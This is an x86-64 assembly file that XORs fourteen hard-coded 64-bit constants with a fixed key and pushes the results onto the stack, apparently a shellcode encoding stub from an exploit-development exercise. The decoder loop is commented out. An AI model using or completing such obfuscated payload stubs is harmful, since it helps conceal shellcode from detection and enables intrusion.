global _start

section .data
      number db 8

section .text

_start:

mov rbx,0x2144d2144d2144d2
mov rax,0xa284ee5c7cde4bd7
xor rax, rbx
push   rax
mov rax,0x935add110510849a
xor rax, rbx
push   rax
mov rax,0x10b29a9dab697500
xor rax, rbx
push   rax
mov rax,0x200ce3eb0d96459a
xor rax, rbx
push   rax
mov rax,0xe64c30e305108462
xor rax, rbx
push   rax
mov rax,0x69cd355c7c3e0c51
xor rax, rbx
push   rax
mov rax,0x65659a2584a185d6
xor rax, rbx
push   rax
mov rax,0x69ff00506c6c5000
xor rax, rbx
push   rax
mov rax,0x3127e434aa505681
xor rax, rbx
push   rax
mov rax,0x6af2a5571e69ff48
xor rax, rbx
push   rax
mov rax,0x6d179aaff20709e6
xor rax, rbx
push   rax
mov rax,0x9ae3f152315bf1c9
xor rax, rbx
push   rax
mov rax,0x373ab4bb0900179a
xor rax, rbx
push   rax
mov rax,0x69751244059aa2a3
xor rax, rbx
push rax
;mov rcx,14
;mov rdx,rsp
loop:
;    mov rdi,[rdx]
 ;   xor rdi, rbx
  ;  push rdi
   ; add rdx, byte 8
    ;loop loop

nop:
nop
nop

